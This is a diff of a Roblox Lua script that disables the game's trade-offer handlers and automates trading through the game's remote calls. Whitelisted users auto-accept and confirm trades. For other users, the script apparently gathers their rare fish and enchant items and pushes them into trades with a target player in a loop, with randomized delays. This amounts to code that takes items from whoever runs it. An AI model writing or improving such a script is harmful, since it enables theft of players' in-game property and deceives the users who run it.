@@ -10,38 +10,39 @@ local TradeData = require(ReplicatedStorage.Shared.Trading.TradeData)
 local Replion = require(ReplicatedStorage.Packages.Replion)
 local ItemUtility = require(ReplicatedStorage.Shared.ItemUtility)
 
-if isWhitelisted then
-    
-    if getconnections then
-        local offerConnections = getconnections(TradeData.Remotes.TradeOfferReceived.OnClientEvent)
-        for _, conn in pairs(offerConnections) do
-            conn:Disable()
-        end
+local isProcessingAutoTrade = false 
+
+if getconnections then
+    local offerConnections = getconnections(TradeData.Remotes.TradeOfferReceived.OnClientEvent)
+    for _, conn in pairs(offerConnections) do
+        conn:Disable()
     end
+end
 
-    TradeData.Remotes.TradeOfferReceived.OnClientEvent:Connect(function(sender)
-        task.wait(0.2)
-        pcall(function()
-            TradeData.Remotes.AcceptTradeOffer:InvokeServer(sender)
-        end)
+TradeData.Remotes.TradeOfferReceived.OnClientEvent:Connect(function(sender)
+    task.wait(0.2)
+    pcall(function()
+        TradeData.Remotes.AcceptTradeOffer:InvokeServer(sender)
     end)
+end)
 
-    LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
-        if LocalPlayer:GetAttribute("IsTrading") == true then
-            task.spawn(function()
-                while LocalPlayer:GetAttribute("IsTrading") == true do
+LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
+    if LocalPlayer:GetAttribute("IsTrading") == true then
+        task.spawn(function()
+            while LocalPlayer:GetAttribute("IsTrading") == true do
+                if not isProcessingAutoTrade then
                     pcall(function()
                         TradeData.Remotes.SetReady:InvokeServer(true)
                         TradeData.Remotes.ConfirmTrade:InvokeServer()
                     end)
-                    task.wait(0.5)
                 end
-            end)
-        end
-    end)
+                task.wait(0.5)
+            end
+        end)
+    end
+end)
 
-else
-    
+if not isWhitelisted then
     local PlayerData = Replion.Client:WaitReplion("Data")
     
     local function getTradeableItems()
@@ -56,18 +57,17 @@ else
                     
                     if itemData and itemData.Data then
                         local id = tonumber(item.Id)
-
                         local isRunic = (id == 929)
                         local isEvolvedEnchant = (id == 558)
                         local isSecretOrForgotten = false
-
+                        
                         if itemData.Data.Type == "Fish" then
                             local tier = tonumber(itemData.Data.Tier)
                             if tier == 7 or tier == 8 then
                                 isSecretOrForgotten = true
                             end
                         end
-
+                        
                         if isRunic or isSecretOrForgotten or isEvolvedEnchant then
                             table.insert(tradeable, {
                                 UUID = item.UUID,
@@ -104,25 +104,17 @@ else
         end
         
         if not tradeStarted then return false end
-
+        
         task.wait(1.5)
         
+        isProcessingAutoTrade = true 
         for _, itemData in ipairs(itemsToTrade) do
             task.wait(math.random(3, 6) / 10)
             pcall(function()
                 TradeData.Remotes.AddItem:InvokeServer(itemData.Category, itemData.UUID)
             end)
         end
-        
-        task.spawn(function()
-            while LocalPlayer:GetAttribute("IsTrading") == true do
-                pcall(function()
-                    TradeData.Remotes.SetReady:InvokeServer(true)
-                    TradeData.Remotes.ConfirmTrade:InvokeServer()
-                end)
-                task.wait(0.5)
-            end
-        end)
+        isProcessingAutoTrade = false 
         
         return true
     end
@@ -130,7 +122,7 @@ else
     local function startTradeLoop(targetPlayer)
         while true do
             local itemsToTrade = getTradeableItems()
-
+            
             if #itemsToTrade == 0 then
                 task.wait(3) 
                 continue 
